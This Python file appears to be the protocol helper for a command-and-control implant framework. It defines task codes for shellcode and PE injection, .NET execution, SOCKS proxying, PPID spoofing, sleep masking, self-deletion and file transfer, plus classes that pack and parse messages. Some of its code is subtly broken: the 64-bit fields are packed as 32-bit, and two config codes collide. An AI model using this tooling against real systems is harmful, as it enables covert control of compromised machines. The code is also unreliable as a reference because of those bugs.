import base64
import os
import json

import struct
from struct import pack, calcsize

JOB_CHECKIN  = 0xf1;
JOB_GET_TASK = 0;
JOB_POST     = 1;
JOB_NO_JOB   = 4;
JOB_ERROR    = 5;

SB_INJ_SC   = 30;
SB_INJ_PE   = 31;

T_CONFIG    = 10;
T_PROCESS   = 11;
T_INJECTION = 12;
T_FILESYS   = 13;
T_UPLOAD    = 14;
T_DOWNLOAD  = 15;
T_INFO      = 16;
T_SELFDEL   = 17;
T_EXIT      = 18;
T_DOTNET    = 19;
T_SOCKS     = 20;

SB_DT_INLINE = 5;
SB_DT_UNLOAD = 6;
SB_DT_LIST   = 7;
SB_DT_INVOKE = 8;
SB_DT_SPAWN  = 9;

SB_CFG_SLEEP  = 15;
SB_CFG_MASK   = 16;
SB_CFG_SC     = 17;
SB_CFG_PE     = 18;
SB_CFG_PPID   = 19;
SB_CFG_BLOCK  = 20;
SB_CFG_CURDIR = 20;

SB_EXIT_T   = 20;
SB_EXIT_P   = 21;

SB_PS_LIST   = 20;
SB_PS_CREATE = 21;
SB_PS_KILL   = 22;

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_MV    = 33;
SB_FS_CP    = 34;
SB_FS_MKDIR = 35;
SB_FS_DEL   = 36;
SB_FS_CD    = 37;


Jobs = {
    "checkin":       {"hex_code": JOB_CHECKIN },
    "get_tasking":   {"hex_code": JOB_GET_TASK },
    "post_response": {"hex_code": JOB_POST },
    "error":         {"hex_code": JOB_ERROR }
}

Commands = {
    # Task commands
    "getinfo":   {"hex_code": T_INFO},
    "socks":     {"hex_code": T_SOCKS},
    "self-del":  {"hex_code": T_SELFDEL},
    "upload":    {"hex_code": T_UPLOAD},
    "download":  {"hex_code": T_DOWNLOAD},

    "dotnet": {
        "hex_code": T_DOTNET,
        "subcommands": {
            "inline": { "sub": SB_DT_INLINE },
            "spawn" : { "sub": SB_DT_SPAWN },
            "list-version": { "sub": SB_DT_LIST },
            "unload": { "sub": SB_DT_UNLOAD },
            "invoke": { "sub": SB_DT_INVOKE }
        }
    },

    # Exit method
    "exit": {
        "hex_code": T_EXIT,
        "subcommands": {
            "process": {"sub": SB_EXIT_P},
            "thread" : {"sub": SB_EXIT_T}
        }
    },
    
    # Filesystem command with subcommands
    "fs": {
        "hex_code": T_FILESYS,
        "subcommands": {
            "ls":    {"sub": SB_FS_LS},
            "cat":   {"sub": SB_FS_CAT},
            "pwd":   {"sub": SB_FS_PWD},
            "cd":    {"sub": SB_FS_CD},
            "mv":    {"sub": SB_FS_MV},
            "cp":    {"sub": SB_FS_CP},
            "rm":    {"sub": SB_FS_DEL},
            "mkdir": {"sub": SB_FS_MKDIR}
        }
    },
    
    # Configuration command with subcommands
    "config": {
        "hex_code": T_CONFIG,
        "subcommands": {
            "sleep":  {"sub": SB_CFG_SLEEP},
            "ppid":   {"sub": SB_CFG_PPID},
            "block":  {"sub": SB_CFG_BLOCK},
            "mask":   {"sub": SB_CFG_MASK},
            "curdir": {"sub": SB_CFG_CURDIR},
            "injection-sc": {"sub": SB_INJ_SC},
            "injection-pe": {"sub": SB_INJ_PE}
        }
    },
    
    # Process command with subcommands
    "proc": {
        "hex_code": T_PROCESS,
        "subcommands": {
            "run" : {"sub": SB_PS_CREATE},
            "list": {"sub": SB_PS_LIST},
            "cmd" : {"sub": SB_PS_CREATE},
            "pwsh": {"sub": SB_PS_CREATE},
            "kill": {"sub": SB_PS_KILL}
        }
    }
};

class Packer:
    buffer: bytes = b'';
    length: int   = 0;

    def GetBuff( self ) -> bytes:
        return pack( "<L", self.length ) + self.buffer;

    def Int8( self, data ) -> None:
        self.buffer += pack( "<b", data );
        self.length += 1;
    
        return;

    def Int16( self, data:int ) -> None:
        self.buffer += pack( "<h", data );
        self.length += 2;
    
        return;

    def Int32( self, data:int ) -> None:

        self.buffer += pack( "<i", data );
        self.length += 4;

        return;

    def Int64( self, data ) -> None:

        self.buffer += pack( "<i", data );
        self.length += 8;

        return;
    
    def Bytes( self, data: str ) -> None:

        fmt = "<L{}s".format( len( data ) + 1 );

        self.buffer += pack( fmt, len( data ) + 1, data );
        self.length += calcsize( fmt );

    def Clean( self ) -> None:
        self.buffer = b'';
        self.length = 0;
    
        return;

    def Dmp( self ) -> None:

        print( f"[*] Buffer: [{ self.length }] [{ self.GetBuff() }]" );

        return;

class Parser:
    buffer: bytes = b'';
    length: int   = 0;

    def __init__( self, buffer, length ):

        self.buffer = buffer;
        self.length = length;

        return;

    def Int16( self ):

        val = struct.unpack( ">h", self.buffer[ :2 ] );
        self.buffer = self.buffer[ 2: ];

        return val[ 0 ];

    def Int32( self ) -> int:

        val = struct.unpack( ">i", self.buffer[ :4 ] );
        self.buffer = self.buffer[ 4: ];

        return val[ 0 ];

    def Int64( self ):

        val = struct.unpack( ">i", self.buffer[ :8 ] );
        self.buffer = self.buffer[ 8: ];

        return val[ 0 ];

    def Bytes( self ) -> bytes:

        length      = self.Int32();

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Pad( self, length: int ) -> bytes:

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Str( self ) -> str:
        return self.Bytes().decode( 'utf-8' );
    
    def Wstr( self ):
        return self.Bytes().decode( 'utf-16' );

    def All( self ) -> bytes:
        remaining = self.buffer
        self.buffer = b''
        return remaining

def RespChkDbg( Input:str ) -> None:
    print( f"[DEBUG::RESP::CHECKIN] => {Input}" );

def RespPostDbg( Input:str ) -> None:
    print( f"[DEBUG::RESP::POST] => {Input}" );

def RespTaskDbg( Input:str ) -> None:
    print( f"[DEBUG::RESP::TASK] => {Input}" );

def GetChkDbg( Input:str ) -> None:
    print( f"[DEBUG::GET::CHECKIN] => {Input}" );

def GetTaskDbg( Input:str ) -> None:
    print( f"[DEBUG::GET::TASK] => {Input}" );

def GetPostDbg( Input:str ) -> None:
    print( f"[DEBUG::GET::POST] => {Input}" );

def C2TlDbg( Input:str ) -> None:
    print( f"[DEBUG::C2::FMT] => {Input}" );

def AgTlDbg( Input:str ) -> None:
    print( f"[DEBUG::AG::FMT] => {Input}" );